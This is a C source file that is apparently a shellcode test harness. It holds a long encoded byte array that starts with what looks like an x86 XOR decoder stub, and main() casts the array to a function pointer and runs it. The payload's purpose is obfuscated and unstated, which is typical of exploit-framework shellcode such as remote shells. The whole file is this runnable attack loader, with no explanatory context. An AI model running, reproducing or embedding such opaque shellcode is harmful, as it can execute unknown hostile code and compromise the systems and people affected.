#include <stdio.h>
#include <string.h>

unsigned char code [] =\
"\xfc\xbb\x56\x8f\x2e\x82\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xaa\x34\xe9\xa9\xe6"
"\x1b\x1d\xa1\x58\xca\xd0\xa4\xc9\xf3\xd1\x5c\xd1\x81\x22\x9d"
"\x39\x86\x32\xdd\x46\x62\x5d\xa1\x84\xda\xd3\xa6\x44\xf5\xec"
"\x40\x73\xf6\x54\x47\x16\x6d\x44\x64\x46\x63\x85\xa9\x58\x79"
"\xa2\xc6\x60\x29\x4e\x07\xa2\xa7\x96\xfe\x27\x50\x1c\x92\xf3"
"\x8d\xfc\x26\x9e\x1d\x6b\x56\x0b\x29\x41\x7b\xc2\x76\x12\x7e"
"\xac\x89\x24\x5e\x73\x00\x17\xc5\x48\x05\xe4\xb4\x98\x34\xd6"
"\xac\x82\xc1\x53\xfa\x35\xe7\xde\x1f\x33\x94\xcf\xab\x24\x3b"
"\x1f\x5f\xc1\x5e\x38\x66\x86\x64\x4c\xb7\x97\xd7\x81\xea\x11"
"\x4e\x2d\xf6\xdc\x8b\x14\xa5\x49\x08\x37\x3b\xc2\x52\x60\x07"
"\x8e\x8d\x9d\x5f\x32\x0a\x7c\xc4\x91\xc0\x28\xd3\xcd\x07\xeb"
"\xe2\x43\xc2\xb3\xf4\x01\x1c\x5d\xc3\x8c\xf7\xc1\x5e\x59\x31"
"\xab\x49\x88\x92\x1c\x0f\x1d\xac\x37\x59\x3c\x90\x72\x50\x4f"
"\xfc\x2f\x34\x2f\x4f\x03\xb3\x3d\xf6\xaf\x9f\x6c\x45\x40\xa3"
"\xe2\x5d\xfb\xac\x95\xc7\x2e\xef\x2c\xd9\xf5\xb1\xd2\x61\xc2"
"\x10\x66\xca\x84\xca\xf1\x27\x7c\xb0\xf9\xf1\xe1\xcc\x3e\x70"
"\x99\x9f\x8c\xf6\x7d\x4f\x8d\xcf\xff\x46\x9b\xf3\x9c\xc1\x45"
"\xc0\x8e\xf8\x15\xb6\xed\x98\x0f\x96\x71\x59\x68\xd6\xa4\x6c"
"\x19\x1e\xc1\xf6\x04\x8b\x5f\x3d\x51\x74\x7d\x73\xf1\x95\x20"
"\xe6\x41\xc6\x3b\x02\x90\x71\xbe\x0e\xf1\xf5\xc2\xb5\x03\x9c"
"\x0f\x60\x8d\xd8\xec\x4d\x83\x19\xc2\x54\x55\x3d\xcc\x17\x0c"
"\x90\x80\x25\x80\xa1\x17\x16\xd6\xc4\x8c\x68\xe4\x7c\x94\xf7"
"\x04\xaa\xd4\x4e\x17\xec\xae\x18\x7b\x6c\x3a\xbc\xdc\xfb\xb1"
"\x01\x0c\xf1\xf8\x78\xe4\x40\x04\x9c\x7a\x70\xac\x3f\xfa\xe6"
"\x4a\x39\x9c\x39\x21\x1a\x57\x1a\xf4\x49\xb8\x5e\x6c\x54\x76"
"\xdf\xb1\xfa\xbe\xbc\x0a\x99\xbb\xb2\xda\xd4\x66\xd6\xd0\xcd"
"\x3a\x4c\x2b\x76\xe7\x43\x89\xc1\x46\x65\x53\xae\x67\x6d\x69"
"\x82\x92\x04\x5c\x52\x37\x64\xd0\x14\x78\xe7\x98\x0e\xcb\x16"
"\x22\x09\xb5\x68\xd2\xc7\x4f\xac\x12\x90\x0d\x6e\xdc\xbc\x2e"
"\x01\x8f\xec\xe9\xa5\xa6\xd6\x14\x39\xaa\x6e\xe9\xc0\xe2\xaf"
"\x50\x05\x33\x87\xfb\x4e\x8e\xdb\xa7\x2b\xd2\x98\xd5\x5a\x4d"
"\x4a\x88\xc0\x9a\x3f\xa1\xd8\xaa\x2b\xef\x73\x5b\x7c\xf8\x2d"
"\x84\x7a\x91\x92\xb8\x63\x40\x56\x05\xc6\x3b\xa9\xfc\xe8\x8d"
"\xfe\xf1\xa4\xe5\x7a\xe3\xf6\x9e\xb1\xaa\xf0\xd8\xfe\x9a\xa5"
"\xc6\xd3\xfc\x3a\xbf\x68\x57\xf9\x6b\x5b\xe2\x5a\x5a\xb9\xc2"
"\xef\x08\x74\x04\x78\xae\xad\xbc\x25\x8e\x2c\xca\xf5\x46\xdb"
"\xf1\xf4\xe9\x16\xf4\xeb\xfe\xdd\xb4\x98\x4a\x41\x5f\xe2\x31"
"\x7f\x8c\x1f\x25\x82\x1e\xd6\x79\xba\x50\x52\x1c\xa7\xb7\xf4"
"\xae\xaa\x60\xb7\x6f\xcd\xdf\xaa\x2c\xbe\xa4\x47\xf9\x80\xfc"
"\x02\xce\x59\x88\x36\x0f\x6b\x26\xad\xfc\x54\x53\xd6\x43\x83"
"\xfe\xc6\x4a\x4f\x49\x26\xcc\x22\x4b\x57\x86\xb6\x73\x57\x91"
"\x5c\x83\xd1\x22\x5e\x03\x7d\xfa\x14\x4c\x8d\x5e\x39\x08\x61"
"\x75\x0f\x5e\x95\x3a\x73\xe3\xff\x6f\x2a\xe1\xbc\x7c\xd2\xeb"
"\x83\x8e\xff\xe9\xc2\x82\xff\x11\x3b\x9a\xff\x11\x3b";

main()
{
	printf("Shell code length is %d \n", strlen(code));
	int (*ret)() = (int (*)())code;
	ret();
}

